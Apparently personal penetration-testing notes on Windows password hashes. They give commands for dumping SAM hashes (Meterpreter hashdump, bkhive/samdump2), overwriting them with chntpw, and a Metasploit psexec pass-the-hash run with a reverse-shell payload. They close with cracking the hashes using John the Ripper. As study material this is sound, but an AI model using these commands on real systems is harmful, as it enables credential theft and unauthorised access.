
#### Rainbow  Tables

A rainbow table is a table of pre-computed cyphertext <-> plaintext pairs. More information: https://kestas.kuliukas.com/RainbowTables/ .

- Windows XP/Vista/7 RTs: https://ophcrack.sourceforge.io/tables.php
---

#### Windows Passwords

![[Pasted image 20230109214109.png]]
*(What todo with Windows passwords)*

---

#### Stealing Windows Hashes

Both methods require at least an user account with administrative privileges.

**1. Remotly**

Using tools:
- http://foofus.net/goons/fizzgig/pwdump/
- http://foofus.net/goons/fizzgig/fgdump/
- https://ophcrack.sourceforge.io/ (recommended)
or a Meterpreter session:

```
meterpreter> run hashdump
```

**2. Locally & Online**

- Usign pwndump: http://foofus.net/goons/fizzgig/pwdump/ , https://www.tarasco.org/security/pwdump_7/ (v7)
- Using fgdump: http://foofus.net/goons/fizzgig/fgdump/default.htm
- Using ophcrack: https://ophcrack.sourceforge.io/
- Using l0phtcrack: https://l0phtcrack.gitlab.io/ (updated)


**3. Locally & Offline**

Boot a live system before booting the main operating system (in this case Windows). 

```
cd /mnt/sda1/WINDOWS/system32/config
bkhive system syskey.txt
# for Windows 7: bkhive SYSTEM syskey.txt
samdump2 SAM syskey.txt > ourhashdump.txt
cat ourhashdump.txt
```

---

#### Overwriting Windows Hashes

These tools are changing the contents of the SAM file which stores user passwords in form of hashes.

```
chntpw -i /media/[HASH]/WINDOWS/system32/config/SAM
```

---

#### Pass the Hash

Exploitation using Metasploit:

```
msf > use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST [host]
set LPORT 443
set RHOST [target]
set SMBUser [username]
set SMBPass [password hash]
exploit
```

**Attention:** If a LM (Lan Manager Hash; old) or NT hash is missing it can be set with 32 * 0:

```
set SMBPass 00000000000000000000000000000000:0446385C4CBFBAED9F33E1D7B00E184C
```

---

#### Cracking Hashes

Using John the Ripper: https://www.openwall.com/john/ .
The file format of a hash (NT/LM) to crack with `john` :

```
eLS:0446385C4CBFBAED9F33E1D7B00E184C
[user]:[hash]
```

**Cracking it**

```
john.exe --incremental hashtocrack.txt
```

Other tools that can be used: `ophcrack` (also allows RTs) or Hashcat: https://hashcat.net/hashcat/ .

